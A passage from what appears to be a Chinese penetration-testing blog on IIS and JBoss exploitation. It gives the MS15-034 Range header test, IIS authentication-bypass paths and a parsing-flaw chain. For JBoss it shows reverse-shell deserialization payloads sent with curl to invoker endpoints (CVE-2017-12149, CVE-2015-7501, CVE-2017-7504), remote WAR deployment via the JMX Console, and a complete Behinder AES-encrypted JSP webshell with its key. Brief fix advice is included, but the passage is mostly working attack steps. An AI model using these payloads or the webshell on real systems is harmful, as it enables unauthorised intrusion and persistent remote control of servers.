id="0x02-HTTP-SYS远程代码执行-MS15-034"><a href="#0x02-HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="0x02 HTTP.SYS远程代码执行(MS15-034)"></a>0x02 HTTP.SYS远程代码执行(MS15-034)</h2><p>HTTP.SYS是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.SYS</p><p>HTTP.SYS远程代码执行漏洞实质是HTTP.SYS的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p><p>主要存在Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2/Server 2012/Server 2012 R2以及Windows 7/8/8.1操作系统都受到这个漏洞的影响验证这个漏洞</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Windows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和<br>Windows server 2012 R2</p><h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>IIS7.5、IIS8.0、IIS8.5</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://img-blog.csdnimg.cn/20210420225200570.png" alt="在这里插入图片描述"></p><p>竟然304了</p><p>这里说一下304这个状态码</p><p>304状态码或许不应该认为是一种错误，而是对客户端有缓存情况下服务端的一种响应</p><p>直接Ctrl+F5强制刷新就可以了</p><p>ok  正常了 拿到了200的状态码</p><p><img src="https://img-blog.csdnimg.cn/20210420225313347.png" alt="在这里插入图片描述"><br>JS前端的修改进行验证</p><p><img src="https://img-blog.csdnimg.cn/20210420225344643.png" alt="在这里插入图片描述"><br>添加这段内容进行验证</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">Range: bytes=0-18446744073709551615<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210420225420587.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210420225511491.png" alt="在这里插入图片描述"></p><p>返回码状态为416 Requested Range Not Satisfiable</p><p>则存在 HTTP.SYS远程代码执行漏洞</p><p>漏洞影响版本：IIS6.0，IIS7.5</p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>安装修复补丁(KB3042553)</p><h2 id="0x03-认证绕过漏洞"><a href="#0x03-认证绕过漏洞" class="headerlink" title="0x03 认证绕过漏洞"></a>0x03 认证绕过漏洞</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Microsof IIS是 Microsoft windows系统默认自带的Web服务器软件，其中默认包含FTP服务。Microsof IIS中存在认证绕过漏洞和源码泄露漏洞，该漏洞源于对用户提供的输入未经正确的验证。攻击者可利用这些漏洞在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问，且有助于进一步攻击。</p><h3 id="漏洞影响版本-1"><a href="#漏洞影响版本-1" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>IIS6.0、IIS7.5</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>Microsof IIS由于无法正确清理用户提供的输入，容易岀现身份验证绕过漏洞和源代码泄露漏洞。</p><p>主要包括以下三类绕过</p><p>（1）安装了PHP的Microsof IIS6.0身份验证绕过</p><p>IIS/6.0加载受保护（如：admin）目录中的PHP文件需要用户认证信息（用户名和密码访问），如果将“<code>∷$INDEX_ALLOCATION</code>”后缀附加到目录名称后面，存在绕过认证并可能访问管理文件等特殊情况，导致IIS服务器重要信息泄露:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">/</span>admin<span class="token operator">::</span>$INDEX_ALLOCATION<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）Microsof IIS7.5经典ASP身份验证绕过</p><p>配置了经典ASP和 .NET Framework 4.0的Microsof IIS7.5，通过将<code>:i30:I NDEX_ALLOCATION</code>后缀附加到需要认证的请求目录名称后面，可以绕过经典的ASP文件访问限制</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">/</span>admin<span class="token operator">:</span>$i30<span class="token operator">:</span>$INDEX_ALLOCATION<span class="token operator">/</span>index<span class="token punctuation">.</span>asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）Microsof IIS7.5 .NET源代码公开和身份验证绕过</p><p>在配置中安装了PHP的Microsof IIS7.5，存在认证绕过漏洞；</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">http<span class="token operator">:</span><span class="token comment">//&lt;victimIIS75&gt;/admin:$i30:$INDEX_ALLOCATION/admin.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="演示一下第三个"><a href="#演示一下第三个" class="headerlink" title="演示一下第三个"></a>演示一下第三个</h3><p>.NAT版本需要是4以上</p><p><img src="https://img-blog.csdnimg.cn/20210421062847634.png" alt="在这里插入图片描述"></p><p>网站目录在这里</p><p>搞个文件夹 丢个index.php</p><p><img src="https://img-blog.csdnimg.cn/20210421063401203.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210421063455662.png" alt="在这里插入图片描述"></p><p>当我们把这个匿名身份验证禁用</p><p><img src="https://img-blog.csdnimg.cn/20210421063526720.png" alt="在这里插入图片描述"></p><p>访问一下</p><p>就变成401的未授权了</p><p><img src="https://img-blog.csdnimg.cn/20210421063602892.png" alt="在这里插入图片描述"></p><p>然后我们进行绕过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">http<span class="token operator">:</span><span class="token comment">//IP/a001:$i30:$INDEX_ALLOCATION/index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x04-解析漏洞-认证绕过漏洞"><a href="#0x04-解析漏洞-认证绕过漏洞" class="headerlink" title="0x04 解析漏洞+认证绕过漏洞"></a>0x04 解析漏洞+认证绕过漏洞</h2><p>目标站点限制上传和访问php文件</p><p>可以利用上传aspx（.net支持解析的文件类型）文件逃避限制，将其当做php代码执行</p><p>网站目录下有一个 <code>index.aspx</code>的文件，里面写有php代码</p><p>在这里插入图片描述</p><p>认证漏洞绕过访问 index.aspx文件，页面返回乱码，未执行 phpinfo代码！</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">http<span class="token operator">:</span><span class="token comment">//IP/a001:$i30:$INDEX_ALLOCATION/index.aspx</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我们在加上解析漏洞</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">http<span class="token operator">:</span><span class="token comment">//IP/a001:$i30:$INDEX_ALLOCATION/index.aspx/.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里插入图片描述</p><p>成功执行</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IIS小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jboss小结</title>
      <link href="/2021/10/28/jboss/"/>
      <url>/2021/10/28/jboss/</url>
      
        <content type="html"><![CDATA[<h1 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或 Jetty绑定使用。</p><p>Jetty是一个开源的servlet容器，它为基于Java的web容器，例如JSP和 servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将 Jetty容器实例化成一个对象，可以迅速为一些独立运行(stand-alone)的Java应用提供网络和web连接。</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><pre class="line-numbers language-none"><code class="language-none">8080 9990<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官网： <a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a> </p><p>需要安装Java环境  这里要注意JDK的版本 java7</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114652.png" alt="1619447111171"></p><p>配置Jboss环境变量</p><pre class="line-numbers language-none"><code class="language-none">JBOSS_HOME C:\JBoss6\jboss-6.1.0.Final<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114653.png" alt="1619446909142"></p><pre class="line-numbers language-none"><code class="language-none">;%JBOSS_HOME%\bin;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114654.png" alt="1619446953719"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114655.png" alt="1619490387253"></p><p>进行启动</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114656.png" alt="1619447249477"></p><p>出现INFO 说明配置成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114657.png" alt="1619447305216"></p><p>Jboss默认部署路径</p><pre class="line-numbers language-none"><code class="language-none">xxx\jboss-6.1.0.Final\server\default\deploy\ROOT.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本地访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114658.png" alt="1619486155535"></p><p>修改内容 达到远程访问</p><p><code>xxx\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml</code>修改配置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114659.png" alt="1619486216237"></p><pre class="line-numbers language-none"><code class="language-none">将address="${jboss.bind.address}"--&gt;address="0.0.0.0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114700.png"></p><p>重启一下</p><p>kali远程访问</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114701.png" alt="1619488579969"></p><h1 id="Jboss渗透"><a href="#Jboss渗透" class="headerlink" title="Jboss渗透"></a>Jboss渗透</h1><h2 id="JBoss-5-x-6-x反序列化漏洞-CVE-2017-12149"><a href="#JBoss-5-x-6-x反序列化漏洞-CVE-2017-12149" class="headerlink" title="JBoss 5.x/6.x反序列化漏洞(CVE-2017-12149)"></a>JBoss 5.x/6.x反序列化漏洞(CVE-2017-12149)</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>JBOSSApplication Server反序列化命令执行漏洞,远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码</p><h3 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h3><p>JBoss 5.x/6.x</p><h3 id="验证是否存在漏洞"><a href="#验证是否存在漏洞" class="headerlink" title="验证是否存在漏洞"></a>验证是否存在漏洞</h3><pre class="line-numbers language-none"><code class="language-none">/invoker/readonly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114702.png" alt="1619488613005"></p><p>返回500，说明此页面存在反序列化漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>配置javac的环境</p><p>我这边在kali进行操作</p><pre class="line-numbers language-none"><code class="language-none">cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz## 这里要科学上网 配置代理tar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功安装</p><p>不用管上面那个报错</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114703.png" alt="1619488997104"></p><p>利用工具：JavaDeserH2HC</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/joaomatosf/JavaDeserH2HC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们选择一个 Gadget：ReverseshellCommonsCollectionsHashMap，编译并生成序列化数据：</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114704.png" alt="1619489165555"></p><p>生成：ReverseShellCommonsCollectionsHashMap.class</p><pre class="line-numbers language-none"><code class="language-none">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成：ReverseShellCommonsCollectionsHashMap.ser</p><pre class="line-numbers language-none"><code class="language-none">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap IP:端口#IP和端口是vps上nc监听的java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.175.161:8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用：ReverseShellCommonsCollectionsHashMap.ser</p><pre class="line-numbers language-none"><code class="language-none">curl http://192.168.175.195:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功拿到反弹shell</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114705.png" alt="1619489453167"></p><h2 id="JBoss-JMXInvokerServlet反序列化漏洞-CVE-2015-7501"><a href="#JBoss-JMXInvokerServlet反序列化漏洞-CVE-2015-7501" class="headerlink" title="JBoss JMXInvokerServlet反序列化漏洞(CVE-2015-7501)"></a>JBoss JMXInvokerServlet反序列化漏洞(CVE-2015-7501)</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>JBoss中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的jmx组件支持Java反序列化</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><pre class="line-numbers language-none"><code class="language-none">Red Hat JBoss A-MQ6.x版本；BPM Suite(BPMs)6.x版本；BRMS6x版本和5.x版本；Data Grid(JDG)6.x版本；Data virtualization(JDV)6.x版本和5.x版本；Enterprise Application Platform6.x版本，5.x版本和4.3版本；FuSe6.X版本；Fuse Service Works(FSW)6.x版本；Operations Network JBOSs On 3.x版本；Portalc6.x版本；SOA Platforn(SOA-P)5.x版本Web Server JWS)3.x版本；Red Hat OpenShift/XPAAS 3.x版本；Red Hat Subscription Asset Manager1.3版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><pre class="line-numbers language-none"><code class="language-none">/invoker/JMXInvokerServlet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114706.png" alt="1619489513404"></p><p>如上，说明接口开放，此接口存在反序列化漏洞</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接利用CVE-2017-12149的ReverseShellCommonsCollectionsHashMap.ser发送到<code>/invoker/JMXInvokerServlet</code>接口中</p><pre class="line-numbers language-none"><code class="language-none">curl http://192.168.175.195:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样是要开启监听</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114707.png" alt="1619489712013"></p><p>成功拿到shell</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114708.png" alt="1619489746945"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.不需要<code>http-invoker.sar</code>组件的用户  可以直接删除掉</p><p>路径为：C:\JBoss6\jboss-6.1.0.Final\server\default\deploy</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114709.png" alt="1619578923043"></p><p>2.添加如下代码至http-invoker.sar下web.xml的<code>security-constraint</code>标签中，对http-invoker组件进行访问控制</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114710.png" alt="1619579149845"></p><pre class="line-numbers language-none"><code class="language-none">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114711.png" alt="1619579472052"></p><h2 id="JbossMO-JMS反序列化漏洞-CVE-2017-7504）"><a href="#JbossMO-JMS反序列化漏洞-CVE-2017-7504）" class="headerlink" title="JbossMO JMS反序列化漏洞(CVE-2017-7504）"></a>JbossMO JMS反序列化漏洞(CVE-2017-7504）</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Jboss AS 4.x及之前版本中，JbossMQ实现过程的 JMS over HTTP Invocation Layer的HTTPServerlLServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jboss AS 4.x以及之前所有的版本</p><h3 id="安装Jboss4"><a href="#安装Jboss4" class="headerlink" title="安装Jboss4"></a>安装Jboss4</h3><p>需要安装Java环境  这里要注意JDK的版本 java6</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114712.png" alt="1619490273026"></p><p>同样是需要配置Jboss环境变量</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114713.png" alt="1619490342237"></p><p>运行run.bat  </p><p>出现INFO  配置成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114714.png" alt="1619491136856"></p><p>本地访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114715.png" alt="1619491203863"></p><p>配置远程登录</p><pre class="line-numbers language-none"><code class="language-none">C:\jboss-4.2.3.GA\server\default\deploy\jboss-web.deployer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114716.png" alt="1619491306567"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114717.png" alt="1619491370434"></p><pre class="line-numbers language-none"><code class="language-none">将address="${jboss.bind.address}"--&gt;address="0.0.0.0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存退出 重启一下run.bat</p><p>kali远程访问</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114718.png" alt="1619491472926"></p><h2 id="验证漏洞-1"><a href="#验证漏洞-1" class="headerlink" title="验证漏洞"></a>验证漏洞</h2><pre class="line-numbers language-none"><code class="language-none">/jbossmq-httpil/HTTPServerILServlet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114719.png" alt="1619491523601"></p><p>说明是存在漏洞</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-none"><code class="language-none">curl http://192.168.175.196:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114720.png" alt="1619499269483"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114721.png" alt="1619499250210"></p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>升级版本！</p><h2 id="JBoss-EJBlnvokerServle反序列化漏洞-CVE-2013-4810）"><a href="#JBoss-EJBlnvokerServle反序列化漏洞-CVE-2013-4810）" class="headerlink" title="JBoss EJBlnvokerServle反序列化漏洞(CVE-2013-4810）"></a>JBoss EJBlnvokerServle反序列化漏洞(CVE-2013-4810）</h2><h3 id="验证漏洞-2"><a href="#验证漏洞-2" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><pre class="line-numbers language-none"><code class="language-none">/invoker/EJBInvokerServle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>能返回结果 就可以利用</p><h3 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h3><p>与(CVE-2015-7501)漏洞原理相同，这里详细介绍一下两者的区别</p><p>其区别就在于两个漏洞选择的进行其中JMXInvokerServlet和 EJBInvokerServlet利用的是<code>org.jboss.invocation.Marshalledvalue</code>进行的反序列化操作</p><p>而Web-console/Invoker利用的是<code>org.jboss.console.remote.RemoteMBeanInvocation</code>进行反序列化并上传构造的文件</p><h2 id="Administration-Console弱口令"><a href="#Administration-Console弱口令" class="headerlink" title="Administration Console弱口令"></a>Administration Console弱口令</h2><p>Administration Console管理页面存在弱口令</p><p>存在管理界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114722.png" alt="1619500280595"></p><p>弱口令：</p><p>admin：admin</p><p>然后没有验证码 可以爆破</p><p>登陆后台上传war包！</p><p>这里有上传按钮</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114723.png" alt="1619500962012"></p><p>这边用冰蝎的马儿 进行打包war  上传</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114724.png" alt="1619501373965"></p><p>那么上传目录</p><p>就是war包名所在的文件夹</p><pre class="line-numbers language-none"><code class="language-none">/shell/shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114725.png" alt="1619501480638"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114726.png" alt="1619501724403"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114727.png" alt="1619501693853"></p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><h4 id="1-修改密码"><a href="#1-修改密码" class="headerlink" title="1.修改密码"></a>1.修改密码</h4><p>默认密码的位置</p><pre class="line-numbers language-none"><code class="language-none">C:\JBoss6\jboss-6.1.0.Final\server\default\conf\props<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114728.png" alt="1619501855534"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114729.png" alt="1619501876281"></p><h4 id="2-删除-Administration-Console页面"><a href="#2-删除-Administration-Console页面" class="headerlink" title="2.删除 Administration Console页面"></a>2.删除 Administration Console页面</h4><p>Jboss版本&gt;=6.0，Administration Console页面路径为</p><pre class="line-numbers language-none"><code class="language-none">C:\jboss-6.1.0.Final\common\deploy\admin-console.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.0之前的版本</p><pre class="line-numbers language-none"><code class="language-none">C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="低版本-JMX-Console未授权访问"><a href="#低版本-JMX-Console未授权访问" class="headerlink" title="低版本 JMX Console未授权访问"></a>低版本 JMX Console未授权访问</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>JMX Console是Jboss管理控制台，访问控制不严导致的漏洞！</p><p>Jboss 4.x及其之前的版本 console管理路径为/jmx-console/和/web-console/！</p><ul><li>jmx-console的配置文件为</li></ul><pre class="line-numbers language-none"><code class="language-none">/opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml#jboss的绝对路径不同网站不一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Web-Conso|e的配置文件为</li></ul><pre class="line-numbers language-none"><code class="language-none">/opt/jboss/jboss4/server/default/deploy/management/console-mgr.sar/web-console.war/WEB-INF/jboss-web.xml#jboss的绝对路径不同网站不一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>控制台账号密码</li><li>jmx-console和web-console共用一个账号密码，账号密码文件在</li></ul><pre class="line-numbers language-none"><code class="language-none">/opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114730.png" alt="1619511607443"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114731.png" alt="1619511690973"></p><p>保存的路径</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114732.png" alt="1619511810391"></p><p>继续往下翻</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114733.png" alt="1619511744704"></p><p>远程war包部署</p><pre class="line-numbers language-none"><code class="language-none">service apache2 startpython -m SimpleHTTPServer 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>自己本地访问一下 发现是可以的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114734.png" alt="1619596539216"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114735.png" alt="1619596279104"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114736.png" alt="1619596609992"></p><p>部署成功</p><p>查看部署情况 这里要点击一下 Apply Changes 进行部署</p><p>然后在jboss.web.dep</p><h2 id="高版本JMX-Console未授权访问"><a href="#高版本JMX-Console未授权访问" class="headerlink" title="高版本JMX Console未授权访问"></a>高版本JMX Console未授权访问</h2><h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114737.png" alt="1619566650837"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114738.png" alt="1619566687530"></p><p>部署地址</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114739.png" alt="1619566759737"></p><p>查看框架的源代码 我们要找的是<code>methodIndex</code>为<code>17/19</code>的 deploy,填写远程war包的地址进行远程部署</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114740.png" alt="1619566920905"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114741.png" alt="1619566941997"></p><p>对应的是</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114742.png" alt="1619566961392"></p><p>部署成功后 进行点击</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.194:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://xxxx/1.war<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后冰蝎进行远程连接 就可</p><p>本地检查 部署的文件</p><p>路径：</p><pre class="line-numbers language-none"><code class="language-none">C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>定位到store的位置</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.196:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过向store的四个参数传入信息 达到上传shell</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713114743.png" alt="1619580666827"></p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里上传冰蝎的jsp木马</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 